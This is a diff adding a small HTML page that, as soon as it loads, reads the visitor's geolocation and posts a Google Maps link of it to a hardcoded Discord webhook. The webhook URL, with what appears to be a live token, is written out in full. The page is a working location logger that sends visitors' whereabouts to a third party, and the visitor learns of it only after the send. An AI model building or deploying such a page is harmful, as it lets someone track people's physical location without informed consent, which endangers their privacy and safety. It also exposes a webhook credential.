@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Webhook</title>
+    <script>
+        function sendCoordinatesToDiscord(latitude, longitude) {
+            const webhookURL = 'https://discord.com/api/webhooks/1213103130439454820/IeWtPlsgWzVnyU8mPkC29nWg8Pi-NqiMkG0QJOiJJot5K4yzl-BcR4cOZmz7Pl-RNOGu';
+            const googleMapsLink = `https://maps.google.com/maps?q=${latitude},${longitude}`;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: googleMapsLink })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send coordinates to Discord.');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending coordinates to Discord:', error);
+            });
+        }
+
+        window.addEventListener('load', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendCoordinatesToDiscord(latitude, longitude);
+                    document.getElementById('message').innerText = 'Geolocation sent to Discord.';
+                }, error => {
+                    console.error('Error getting geolocation:', error);
+                    document.getElementById('message').innerText = 'Error retrieving geolocation.';
+                });
+            } else {
+                console.error('Geolocation is not supported by this browser.');
+                document.getElementById('message').innerText = 'Geolocation is not supported by this browser.';
+            }
+        });
+    </script>
+</head>
+<body>
+    <h1>Geolocation Webhook</h1>
+    <p id="message">Retrieving geolocation...</p>
+</body>
+</html>
